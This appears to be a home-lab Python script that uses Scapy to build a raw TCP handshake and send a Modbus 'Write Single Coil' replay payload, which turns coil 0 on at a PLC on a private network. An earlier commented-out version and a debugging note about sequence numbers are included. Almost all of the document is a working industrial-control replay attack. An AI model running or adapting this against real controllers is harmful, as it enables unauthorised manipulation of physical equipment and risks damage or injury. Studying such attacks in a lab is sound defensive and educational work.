"""
#Libraries
from scapy.all import *
from scapy.layers.inet import *

# Hardcoded values: PLC (RPI)
MODBUS_SERVER_IP = "192.168.68.117"
MODBUS_PORT = 502
# variable
sport = RandShort()


Modbus TCP Replay Payload
Unit ID: 1, Function: 0x05 (Write Single Coil), Coil Address: 0x0000, Value: 0xFF00 (ON)
Building payload: MBAP header + PDU
b' => indicates its in bytes
| Bytes (Hex) | Field          | Value          |
| ----------- | -------------- | -------------- |
| `00 01`     | Transaction ID | 1              |
| `00 00`     | Protocol ID    | 0              |
| `00 06`     | Length         | 6 bytes (rest) |
| `01`        | Unit ID        | 1              |
| Bytes (Hex) | Meaning                         |
| ----------- | --------------------------------|
| `05`        | Function code: Write Single Coil|
| `00 00`     | Coil address: 0                 |
| `FF 00`     | Value: `0xFF00` =   Turn ON     |


modbus_payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00'

# TCP/IP setup
ip = IP(dst=MODBUS_SERVER_IP)
syn = TCP(sport=sport, dport=MODBUS_PORT, flags="S", seq=1000)
syn_ack = sr1(ip/syn, timeout=2)

if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == "SA":
    my_seq = syn_ack.ack
    my_ack = syn_ack.seq + 1

    # ACK the SYN-ACK
    ack = TCP(sport=sport, dport=MODBUS_PORT, flags="A", seq=my_seq, ack=my_ack)
    send(ip/ack)

    # Send the Modbus payload (PSH+ACK)
    psh = TCP(sport=sport, dport=MODBUS_PORT, flags="PA", seq=my_seq, ack=my_ack)
    send(ip/psh/Raw(load=modbus_payload))

    # Wait for server's response
    def filter_response(pkt):
        return (pkt.haslayer(TCP)
                and pkt[IP].src == MODBUS_SERVER_IP
                and pkt[TCP].sport == MODBUS_PORT
                and pkt[TCP].dport == sport)

    print("Waiting for Modbus response")
    response = sniff(lfilter=filter_response, count=1, timeout=3)
    if response:
        response[0].show()

        # ACK the response (required by some stacks!)
        resp_seq = response[0][TCP].seq
        resp_ack = response[0][TCP].ack
        payload_len = len(response[0][Raw].load) if response[0].haslayer(Raw) else 0
        final_ack = TCP(sport=sport, dport=MODBUS_PORT, flags="A",
                        seq=my_seq + len(modbus_payload),
                        ack=resp_seq + payload_len)
        send(ip/final_ack)

        print("Response acknowledged.")
    else:
        print("No response received (timeout)")

else:
    print("TCP handshake failed. Check if Modbus server is online.")
"""

# ROOT ISSUE: TCP/IP 3 WAY HANDSHAKE IS NOT CORRECTLY ESTABLISHED? SYN FIN DATA IS 0 AND SHOULD BE 1 (WIRESHARK)

from scapy.all import *
from scapy.layers.inet import *

# Target (PLC or Modbus Server)
TARGET_IP = "192.168.68.117"
TARGET_PORT = 502
SPORT = RandShort()
SEQ = 1000

modbus_payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00'

ip = IP(dst=TARGET_IP)
syn = TCP(sport=SPORT, dport=TARGET_PORT, flags="S", seq=SEQ)

print("[*] Sending SYN...")
synack = sr1(ip/syn, timeout=2)
if not synack or not synack.haslayer(TCP) or synack[TCP].flags != "SA":
    print("[!] SYN-ACK not received.")
    exit()

print("[*] Received SYN-ACK.")

# Fix here: use original SEQ+1 as the ACK's SEQ
ack = TCP(sport=SPORT, dport=TARGET_PORT, flags="A",
          seq=SEQ + 1, ack=synack.seq + 1)
send(ip/ack, verbose=0)
print("[*] Sent ACK.")

# Now send payload
psh = TCP(sport=SPORT, dport=TARGET_PORT, flags="PA",
          seq=SEQ + 1, ack=synack.seq + 1)
send(ip/psh/Raw(load=modbus_payload), verbose=0)
print("[*] Sent Modbus payload.")
